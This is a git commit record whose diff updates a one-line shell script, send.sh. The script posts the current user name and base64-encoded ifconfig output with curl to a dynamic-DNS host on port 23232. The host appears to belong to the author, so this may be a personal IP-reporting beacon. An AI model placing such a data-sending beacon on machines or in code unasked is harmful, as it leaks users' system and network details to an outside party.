b0b6c44a5eb916de0b092d55e8b30c7b985eb514
matthewpipie <matthewpipie@gmail.com>
2017-03-31 07:48:58 -0500

    Update send.sh

--- send.sh
+++ send.sh
@@ -1,1 +1,1 @@
-curl "pipie.ddns.net:23232" -d "whoami=$(whoami)&ifconfig=$(ifconfig | base64 -w 0 | tr -- '+=/' '-_~')"
+curl "pipie.ddns.net:23232" -d "whoami=$(whoami)&ifconfig=$(/sbin/ifconfig | base64 -w 0 | tr -- '+=/' '-_~')"
